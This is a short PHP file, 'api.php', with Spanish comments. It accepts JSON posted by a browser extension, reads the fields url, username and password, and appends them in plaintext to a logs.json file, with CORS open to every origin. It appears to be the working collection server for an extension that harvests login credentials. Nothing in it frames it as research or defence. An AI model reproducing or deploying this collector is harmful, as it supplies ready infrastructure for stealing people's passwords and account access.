<?php
// api.php
header('Access-Control-Allow-Origin: *');
header('Content-Type: application/json');

// Archivo donde se guardan los logs
$filename = 'logs.json';

// Leer datos enviados por la extensión
$inputJSON = file_get_contents('php://input');
$input = json_decode($inputJSON, true);

if ($input) {
 $newLog = [
 'id' => time(),
 'url' => $input['url'] ?? 'N/A',
 'username' => $input['username'] ?? 'N/A',
 'password' => $input['password'] ?? 'N/A',
 'timestamp' => $input['timestamp'] ?? date('Y-m-d H:i:s'),
 'status' => 'Escaneado',
 'config' => 'Directo'
 ];

 // Cargar logs existentes
 $logs = [];
 if (file_exists($filename)) {
 $logs = json_decode(file_get_contents($filename), true) ?? [];
 }

 // Agregar nuevo log
 array_unshift($logs, $newLog); // Poner el más reciente primero

 // Guardar de nuevo
 file_put_contents($filename, json_encode($logs, JSON_PRETTY_PRINT));

 echo json_encode(['success' => true, 'message' => 'Datos guardados']);
} else {
 http_response_code(400);
 echo json_encode(['success' => false, 'message' => 'No se recibieron datos']);
}
?>